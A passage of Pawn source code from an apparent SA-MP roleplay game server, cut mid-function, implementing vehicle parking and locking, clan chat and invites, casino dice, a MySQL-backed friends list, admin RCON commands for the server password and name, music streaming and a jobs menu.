				DestroyVehicle(personalcar[10][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[10][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pCarkey11x);
				return 1;
			}
			else if(getcarid == personalcar[11][playerid])
			{
				DestroyVehicle(personalcar[11][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[11][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pCarkey12x);
				return 1;
			}
			else if(getcarid == personalcar[12][playerid])
			{
				DestroyVehicle(personalcar[12][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[12][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pCarkey13x);
				return 1;
			}
			else if(getcarid == personalcar[13][playerid])
			{
				DestroyVehicle(personalcar[13][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[13][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pCarkey14x);
				return 1;
			}
			else if(getcarid == personalcar[14][playerid])
			{
				DestroyVehicle(personalcar[14][playerid]);
				new created = OwnedVeh(getcarid);
				OwnedVeh(getcarid) = 0;
				new car = CreateVehicle(CarInfo[created][cModel],CarInfo[created][cLocationx],CarInfo[created][cLocationy],CarInfo[created][cLocationz]+1.0,CarInfo[created][cAngle],CarInfo[created][cColorOne],CarInfo[created][cColorTwo],500000);
				UpdateVehicleDamageStatus(car, CarInfo[created][cDamage1], CarInfo[created][cDamage2], CarInfo[created][cDamage3], CarInfo[created][cDamage4]);
				Gas[car] = CarInfo[created][cGas];
				OwnedVeh(car) = created;
				personalcar[14][playerid] = car;
				SetVehicleNumberPlate(car, CarInfo[OwnedVeh(car)][cLicense]);
				SetVehicleHealth(car, health2);
				LinkVehicleToInterior(car, interiorr);
				SetVehicleVirtualWorld(car, virtuall);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[PlayerInfo[playerid][pPcarkey]][cLock],bonnet,boot,objective);
				SetPVarInt(playerid, "Engine", 0);
				vUpdate(OwnedVeh(car),cLocationxx);
				vUpdate(OwnedVeh(car),cLocationyx);
				vUpdate(OwnedVeh(car),cLocationzx);
				vUpdate(OwnedVeh(car),cAnglex);
				ModVehicle(car);
				SendClientMessage(playerid, COLOR_SERVER, "Parked car. To respawn car here uses /v.");
				Update(playerid, pCarkey15x);
				return 1;
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in your vehicle.");
	}
	return 1;
}
CMD:lock(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new engine,lights,alarm,doors,bonnet,boot,objective;
	    if(SwitchKey[playerid] == 1)
        {
			new string[100];
			for(new v=0; v<=MAX_PVEHS; v++)
			{
			    if(v == 15) { break; }
		 		if(personalcar[v][playerid] != 0)
		  		{
		        	if(CheckPlayerDistanceToVehicle(5.0, playerid, personalcar[v][playerid]))
					{
				 		if(CarInfo[OwnedVeh(personalcar[v][playerid])][cLock] == 1)
				  		{
		    				GetVehicleParamsEx(personalcar[v][playerid],engine,lights,alarm,doors,bonnet,boot,objective);
		      	    		SetVehicleParamsEx(personalcar[v][playerid],engine,lights,alarm,0,bonnet,boot,objective);
							format(string, sizeof(string), "~h~%s~n~~g~Unlocked",CarInfo[OwnedVeh(personalcar[v][playerid])][cDescription]);
							GameTextForPlayer(playerid, string, 4000, 4);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							CarInfo[OwnedVeh(personalcar[v][playerid])][cLock] = 0;
							gCarLock[personalcar[v][playerid]] = 0;
							vUpdate(OwnedVeh(personalcar[v][playerid]), cLockx); //
							return 1;
						}
						else if(CarInfo[OwnedVeh(personalcar[v][playerid])][cLock] == 0)
						{
		    				GetVehicleParamsEx(personalcar[v][playerid],engine,lights,alarm,doors,bonnet,boot,objective);
		      	    		SetVehicleParamsEx(personalcar[v][playerid],engine,lights,alarm,1,bonnet,boot,objective);
							format(string, sizeof(string), "~h~%s~n~~r~Locked",CarInfo[OwnedVeh(personalcar[v][playerid])][cDescription]);
							GameTextForPlayer(playerid, string, 4000, 4);
							PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
							CarInfo[OwnedVeh(personalcar[v][playerid])][cLock] = 1;
							gCarLock[personalcar[v][playerid]] = 1;
							vUpdate(OwnedVeh(personalcar[v][playerid]), cLockx); //
				        	return 1;
						}
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Your vehicle not near you.");
		 		}
		    	else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have a vehicle.");
			}
        }
		else if(SwitchKey[playerid] == 2)
		{
		    new carid,string[128];
			if(HireCar[playerid] == -1) return SCM(playerid,COLOR_SERVER,"{FFB870}You do not have a rental car/boat/bike/scooter already.");
		    if(HireCar[playerid] != -1)
		    {
				carid = HireCar[playerid];
			}
            if(CheckPlayerDistanceToVehicle(5.0, playerid, HireCar[playerid]))
			{
			    if(gCarLock[carid] == 0)
		        {
			        new vehicles = GetVehicleModel(carid) - 400;
				    format(string, sizeof(string), "~h~%s~n~~r~Locked", aVehicleNames[vehicles]);
				    GameTextForPlayer(playerid, string, 4000, 4);
		  	        PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
					gCarLock[carid] = 1;
	    			GetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
	      	    	SetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,1,bonnet,boot,objective);
		            return 1;
			    }
				else if(gCarLock[carid] == 1)
				{
					new vehicles = GetVehicleModel(carid) - 400;
					format(string, sizeof(string), "~h~%s~n~~g~Unlocked", aVehicleNames[vehicles]);
				    GameTextForPlayer(playerid, string, 4000, 4);
					PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
					gCarLock[carid] = 0;
	    			GetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
	      	    	SetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,0,bonnet,boot,objective);
		            return 1;
				}
			}
		}
	}
    return 1;
}
CMD:premium(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        new string[556];
        format(string,sizeof(string),"{ffffff}Premium Account Benefits:\n- you have interest 0.2.\n- You can lock your whisper-url [/togwhisper].\n- access control /pcolor.\n\nPremium account can be purchased from the online shop server (/shop).");
		ShowPlayerDialog(playerid, DIALOG_PREMIUM, DIALOG_STYLE_MSGBOX, "Premium account:", string, "Close", "");
	}
	return 1;
}
CMD:buyparachute(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(!IsPlayerInRangeOfPoint(playerid,5,-2231.2058,-1736.1578,480.8620)) return SCM(playerid,COLOR_SERVER,"{FFB870}You're not in the place where you can get Parachute.");
	if(GetPlayerCash(playerid) < 10000) return SCM(playerid,COLOR_SERVER,"{FFB870}You do not have the money.");
    GivePlayerWeaponEx(playerid, 46, 1);
    GivePlayerCash(playerid,-10000);
    SCM(playerid,COLOR_SERVER,"You bought parachute for 10,000$.");
	Update(playerid, pCashx);
	return 1;
}
CMD:dn(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    new id,string[MAX_STRING];
    if(sscanf(params, "i", id))
	{
		SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/dn <Name/Playerid>");
		return 1;
	}
	if(PlayerInfo[id][pNMessage] == 0) return SendClientMessage(playerid, COLOR_SERVER, "This player doesn't have a question.");
 	if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
	{
		PlayerInfo[PlayerInfo[playerid][pNRE]][pNMessage] = 0;
		PlayerInfo[PlayerInfo[playerid][pNRE]][pNMessage2] = 0;
		PlayerInfo[PlayerInfo[playerid][pNRE]][pFirstAnswer] = 0;
		PlayerInfo[playerid][pNRE] = -1;
		format(string,sizeof(string),"Admin/Helper %s:@%s, [/n] nu este free chat!",GetName(playerid),GetName(id));
		SendClientMessageToAll(COLOR_NEWBIE, string);
	}
	return 1;
}
CMD:dice(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(!IsPlayerInRangeOfPoint(playerid,50.0,1977.7538,1017.7076,994.4688)) return SCM(playerid,COLOR_SERVER,"You can use this command only in casinos.");
    if(IsPlayerConnected(playerid))
    {
		new id,money,sendername[25],string[184];
		if(sscanf(params, "ud",id,money)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/dice <Name/Playerid> <Money>");
		if(id == INVALID_PLAYER_ID) return SCM(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		if(money < 1 || money > 1000000) return SCM(playerid,COLOR_SERVER,"{FFB870}Money limit is $1,000,000.");
		if(IsPlayerConnected(id))
		{
			if(GetPlayerCash(playerid) < money) return SCM(playerid,COLOR_SERVER,"You and your opponent does not have enough money to play craps.");
		    if(GetPlayerCash(id) < money) return SCM(playerid,COLOR_SERVER,"You and your opponent does not have enough money to play craps.");
		    if(id == playerid) return SendClientMessage(playerid, COLOR_SERVER, "You can not invite yourself to play craps.");
			if(ProxDetectorS(10.0, playerid, id))
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				SendClientMessage(playerid, COLOR_WHITE, "Request the man sent.");
				format(string, sizeof(string), "%s He invited you to play craps with him $%s. Write /accept dice %d To Play.",sendername,FormatNumber(money),playerid);
				SendClientMessage(id, COLOR_WHITE, string);
				Diceid[id] = playerid;
				Dicem[id] = money;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player is not near you.");
		}
    }
	return 1;
}
CMD:c(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	{
		if(PlayerInfo[playerid][pClan] < 1) return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}Error: Your are not in a clan.");
		new msj[100],string[150],sendername[25];
	    if(PlayerInfo[playerid][pMuted] == 1)
	    {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		if(sscanf(params, "s[100]",msj)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/c <Message>");
		GetPlayerName(playerid,sendername,sizeof(sendername));
		if(PlayerInfo[playerid][pClan] != 0)
		{
			if(PlayerInfo[playerid][pCRank] == 1)
			{
				format(string,sizeof(string),"{%s}[CLAN] %s %s: %s",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName1],sendername,msj);
			}
			else if(PlayerInfo[playerid][pCRank] == 2)
			{
				format(string,sizeof(string),"{%s}[CLAN] %s %s: %s",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName2],sendername,msj);
			}
			else if(PlayerInfo[playerid][pCRank] == 3)
			{
				format(string,sizeof(string),"{%s}[CLAN] %s %s: %s",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName3],sendername,msj);
			}
			else if(PlayerInfo[playerid][pCRank] == 4)
			{
				format(string,sizeof(string),"{%s}[CLAN] %s %s: %s",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName4],sendername,msj);
			}
			else if(PlayerInfo[playerid][pCRank] == 5)
			{
				format(string,sizeof(string),"{%s}[CLAN] %s %s: %s",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName5],sendername,msj);
			}
			else if(PlayerInfo[playerid][pCRank] == 6)
			{
				format(string,sizeof(string),"{%s}[CLAN] %s %s: %s",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName6],sendername,msj);
			}
			else if(PlayerInfo[playerid][pCRank] >= 7)
			{
				format(string,sizeof(string),"{%s}[CLAN] %s %s: %s",ClanInfo[PlayerInfo[playerid][pClan]][cClanColor],ClanInfo[PlayerInfo[playerid][pClan]][cClanRankName7],sendername,msj);
			}
		}
		SendToClan(PlayerInfo[playerid][pClan], COLOR_SERVER, string);
	}
	return 1;
}
CMD:quitclan(playerid, params[])
{
	if(PlayerInfo[playerid][pClan] != 0)
	{
		if(PlayerInfo[playerid][pCRank] != 7)
		{
		    ShowPlayerDialog(playerid,DIALOG_QUITCLAN,DIALOG_STYLE_MSGBOX,"Are you sure?","Want to leave current clan?","Yes","Nu");
		}
		else
		{
			ShowPlayerDialog(playerid,DIALOG_QUITCLAN,DIALOG_STYLE_MSGBOX,"Are you sure?","Want to leave current clan?\nBecause you are the leader, the clan will be removed automatically.","Yes","Nu");
		}
   	}
   	else return SendClientMessage(playerid, COLOR_SERVER, "You don't have a clan to quit.");
	return 1;
}
CMD:claninfo(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pClan] < 1) return SendClientMessage(playerid, COLOR_SERVER,"{5CAD5C}Error: Your are not in a clan.");
	new string[100];
	format(string,sizeof(string),"Your clan is %s and you have rank %d.",ClanInfo[PlayerInfo[playerid][pClan]][cClanName],PlayerInfo[playerid][pCRank]);
	SCM(playerid,COLOR_YELLOW,string);
	return 1;
}
CMD:cinvite(playerid, params[])
{
    if(PlayerInfo[playerid][pCRank] < 6) return SendClientMessage(playerid, COLOR_SERVER, "Only playerii with rank 6 and 7 may invite members clan.");
    new userID,giveplayer[25],sendername[25],szMessage[119];
    if(sscanf(params, "u", userID)) return SendClientMessage(playerid, COLOR_SERVER, "Usage: /cinvite [id]");
	{
        if(GetClanMembers(PlayerInfo[playerid][pClan]) >= ClanInfo[PlayerInfo[playerid][pClan]][cClanSlots]) return SendClientMessage(playerid, COLOR_SERVER, "You have reached maximum members.");
		if(userID == playerid) return SendClientMessage(playerid, COLOR_SERVER, "You can not invite one clan.");
		//if(ClanInfo[PlayerInfo[playerid][pClan]][cClanActive] < 1) return SendClientMessage(playerid, COLOR_SERVER, "Nu poti invita membri deoarece clanul a expirat (pentru prelungire intra pe panel).");
		if(IsPlayerConnected(userID))
		{
			if(PlayerInfo[userID][pClan] == 0)
			{
				GetPlayerName(userID,giveplayer,sizeof(giveplayer));
				format(szMessage, sizeof(szMessage), "You have invited %s to join your clan.", giveplayer);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);

				GetPlayerName(playerid,sendername,sizeof(sendername));
				format(szMessage, sizeof(szMessage), "%s I invited clan %s. Use /accept cinvite %d to accept.", sendername, ClanInfo[PlayerInfo[playerid][pClan]][cClanName], playerid);
				SendClientMessage(userID, COLOR_BLUE, "Invitation new clan:");
				SendClientMessage(userID, COLOR_BLUE, szMessage);

				SetPVarInt(userID, "cinvID", PlayerInfo[playerid][pClan]);
				SetPVarInt(userID, "cinvIDD", playerid);
			}
		}
	}
    return 1;
}
CMD:clan(playerid, params[])
{
	if(PlayerInfo[playerid][pClan] >= 1)
	{
		ShowPlayerDialog(playerid, DIALOG_CLAN, DIALOG_STYLE_LIST, "Clan", "Clan Help\nClan Members\nClan Settings\nClan Tag", "Select", "Close");
	}
	return 1;
}
CMD:friends(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new online[1000],offline[1000],query[300],result[30],name[30],idd,mid=1,aim2[2000];
		format(query, sizeof(query), "SELECT * FROM `friends` WHERE `PlayerID` = '%d' AND `Status`='1'",PlayerInfo[playerid][pSQLID]);
		new Cache: membresult = mysql_query(SQL,query);
		for(new i, j = cache_get_row_count (); i != j; ++i)
		{
			idd = cache_get_field_content_int(i, "FriendID");
			cache_get_field_content(i, "FriendName", result); format(name, 30, result);
			Selected[playerid][mid] = idd;
			format(online, sizeof(online), "%s{228404}[online]{FFFFFF} %s\n",online,name);
			mid++;
		}
		cache_delete(membresult);
		format(query, sizeof(query), "SELECT * FROM `friends` WHERE `PlayerID` = '%d' AND `Status`='0'",PlayerInfo[playerid][pSQLID]);
		new Cache: membresult1 = mysql_query(SQL,query);
		for(new i, j = cache_get_row_count (); i != j; ++i)
		{
			idd = cache_get_field_content_int(i, "FriendID");
			cache_get_field_content(i, "FriendName", result); format(name, 30, result);
			Selected[playerid][mid] = idd;
			format(offline, sizeof(offline), "%s{BB172D}[offline]{FFFFFF} %s\n",offline,name);
			mid++;
		}
		cache_delete(membresult1);
		format(aim2,sizeof(aim2),"{F89B0E}[+] Add Friend\n%s%s",online, offline);
		ShowPlayerDialog(playerid, DIALOG_FRIENDS, DIALOG_STYLE_LIST, "Friends", aim2, "Select", "Exit");
	}
	return 1;
}
CMD:togkickafk(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	if(kickafk == 1)
	{
	    kickafk = 0;
	    SCM(playerid,COLOR_SERVER,"You disable afk kick.");
	    return 1;
	}
	else
	{
	    SCM(playerid,COLOR_SERVER,"You enable afk kick.");
	    kickafk = 1;
	}
	return 1;
}
CMD:serverpass(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		new pass[64],string[128];
		if(sscanf(params, "s[64]", pass)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/serverpass <Password>");
		{
			format(string,sizeof(string),"password %s",pass);
			SendRconCommand(string);
			format(string,sizeof(string), "{FFFF00}You change the server password in: %s.",pass);
			SendClientMessage(playerid,COLOR_SERVER,string);
		}
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:servername(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		new name[64],string[128];
		if(sscanf(params, "s[64]", name)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/servername <Name>");
		{
			format(string,sizeof(string),"hostname %s",name);
			SendRconCommand(string);
			format(string,sizeof(string), "{FFFF00}You change the server name in: %s.",name);
			SendClientMessage(playerid,COLOR_SERVER,string);
		}
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:speedlimit(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new string[128], speed;
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(IsABike(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid,COLOR_SERVER,"{999999}Command can not be used on bike.");
		if(IsAPlane(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid,COLOR_SERVER,"{999999}Command can not be used on plane.");
		if(sscanf(params, "i", speed)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/speedlimit <speed>");
		{
			if(speed == 0)
			{
				Speedlimit[playerid] = 0;
				format(string, sizeof(string), "{c4faf6}* You have turned your speed limit off.", speed);
				SendClientMessage(playerid, COLOR_SERVER, string);
				return 1;
			}
			if(speed> 0)
			{
				Speedlimit[playerid] = speed;
				format(string, sizeof(string), "{c4faf6}* You have set your speed limit to %d KM/H.", speed);
				SendClientMessage(playerid, COLOR_SERVER, string);
			}
		}
	}
	else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Error: You are not driving a vehicle.");
	return 1;
}
CMD:togiplog(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 1) return SCM(playerid,COLOR_ERROR, AdminOnly);
	if(togip[playerid] == 0)
	{
	    togip[playerid] = 1;
	    SCM(playerid,COLOR_SERVER,"You enable IP log.");
	    return 1;
	}
	else if(togip[playerid] == 1)
	{
	    togip[playerid] = 0;
	    SCM(playerid,COLOR_SERVER,"You disable IP log.");
	    return 1;
	}
	return 1;
}
CMD:musicforall(playerid, params[])
{	
	if(PlayerInfo[playerid][pAdmin] > 6)
	{
		new link[358];
		if(sscanf(params, "s[358]",link)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/musicforall <Link>");
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			StopAudioStreamForPlayer(i);
			PlayAudioStreamForPlayer(i, link);
		}
	}
	return 1;
}
CMD:bmusic(playerid, params[])
{
	if(InBussines[playerid] > -1)
	{
		if(BizzInfo[InBussines[playerid]][bType] != 3) return SCM(playerid,COLOR_SERVER,"You are not in a bar.");
		new link[358];
		if(strcmp(PlayerInfo[playerid][pNormalName], BizzInfo[InBussines[playerid]][bOwner]) == 0 || PlayerInfo[playerid][pAdmin] > 0)
		{
			if(sscanf(params, "s[358]",link)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/bmusic <Link>");
			format(barstring[InBussines[playerid]], 256, "%s", link);
			foreach(Player, i)
			{
			    if(InBussines[playerid] == InBussines[i])
			    {
			        StopAudioStreamForPlayer(i);
					PlayAudioStreamForPlayer(i, link);
				}
			}
		}
		else return SCM(playerid,COLOR_SERVER,"This is not your business.");
	}
	else return SCM(playerid,COLOR_SERVER,"You are not in a bar.");
	return 1;
}
CMD:carradio(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    {
        ShowPlayerDialog(playerid, Dialog_radio, DIALOG_STYLE_LIST, "Car music:","{0066FF}Radio{FFFFFF} Kiss FM\n{0066FF}Radio{FFFFFF} Pro Fm\n{0066FF}Radio{FFFFFF} Taraf\n{0066FF}Radio{FFFFFF} Bandit\n{0066FF}Radio{FFFFFF} Hot Style\n{0066FF}Radio{FFFFFF} Diz\n{0066FF}Radio{FFFFFF} Tequila\n{0066FF}Radio {FFFFFF}TopZone Radio\nTurn off radio","Ok","Cancel");
    }
    return 1;
}
CMD:carmusic(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	return cmd_carradio(playerid, params);
}
CMD:jobs(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1 && CarJacker[playerid] < 1 && JCurier[playerid][0] < 1)
	{
   	 	ShowPlayerDialog(playerid, DIALOG_JOBS, DIALOG_STYLE_TABLIST_HEADERS,"Jobs:", "Job\tOras\n\
		Detective\tLos Santos\nDrugs Dealer\tLos Santos\nPizza Boy\tLos Santos\nBus Driver\tLos Santos\nMechanic\tLos Santos\nArms Dealer\tLos Santos\nGarbage\tLas Venturas\nFisherman\tLos Santos\nTrucker\tLos Santos\nFarmer\tLos Santos\nCar Jacker\tLas Venturas\nPocket Thief\tLos Santos\n\
		Curier\tLos Santos\nCement Carrier\tLas Venturas\nWorker Career\tLos Santos","Select", "Close");
		return 1;
	}
	else
	{
	    ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
	}
	return 1;
}

CMD:event(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(activeevent == 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFFF45}There is currently no active event running.");
   	new string[300],name[MAX_PLAYER_NAME];
   	foreach(Player, i)
   	{
